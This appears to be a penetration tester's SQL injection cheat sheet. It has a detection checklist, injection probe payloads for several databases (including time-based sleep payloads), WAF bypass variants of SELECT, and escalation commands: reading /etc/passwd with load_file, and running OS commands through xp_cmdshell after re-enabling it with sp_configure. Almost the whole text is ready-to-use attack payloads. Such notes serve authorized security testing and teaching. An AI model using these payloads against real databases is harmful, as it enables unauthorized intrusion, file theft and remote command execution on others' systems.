Automation Tool: [[SQLMap]]

***Detection***
 - [ ] Identify where would information be retrieve from data store
 - [ ] Identify data type of input data
 - [ ] Identify possible injection operators
 - [ ] Construct potential SQL statement
```python
# MySQL & MariaDB
id # column name 
''
""
'+'
"+"
' '
" "
'%20'
"%20"
'%2b'
"%2b"
` # column name injection
``
)
(
()
% # Verify that database is being called (% retrieve all)
\
\\
'\
'\'
&
'&'
"&"
/*
#
;
%3b
//
foo'+'bar
CONCAT('foo','bar')
'-sleep(3)-'
'+sleep(3)+'
"-sleep(3)-"
"+sleep(3)+"
2#
2-- -
2--
(2+1) # Integer Data
(2%2b1)
(2-1)
2+1
2%2b1
2-1
67-ACII('A')
51-ASCII(1)

# SQLite


# PostgreSQL
'||'
"||"
'foo'||'bar'
foo'||'bar
'||pg_sleep(3)||'
"||pg_sleep(3)||"

# Oracle
'||'
"||"
'foo'||'bar'
dbms_pipe.receive_message(('a'), 3)

# MSSQL
'+'
"+"
WAITFOR DELAY '0:00:03'

```

***WAF Bypasses***
- [ ] WAFW00F reveals WAF
```sql
SeLeCt
SELECT
sElEcT
Select
select
%00SELECT
SELSELECTECT
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
SELECT/**/username,password/**/FROM/**/users
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
SEL/*foo*/ECT username,password FR/*foo*/OM users # MySQL
```

***Escalating the Attack***
MySQL Read Files (require FILE_PRIV)
```sql
select load_file('/etc/passwd')
```
MSSQL RCE
```sql
master..xp_cmdshell 'ipconfig > foo.txt'
exec xp_cmdshell 'dir'
```
- Re-enabling xp_cmdshell (sp_configure)
```sql
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE WITH OVERRIDE
EXECUTE sp_configure 'xp_cmdshell', '1'
RECONFIGURE WITH OVERRIDE
```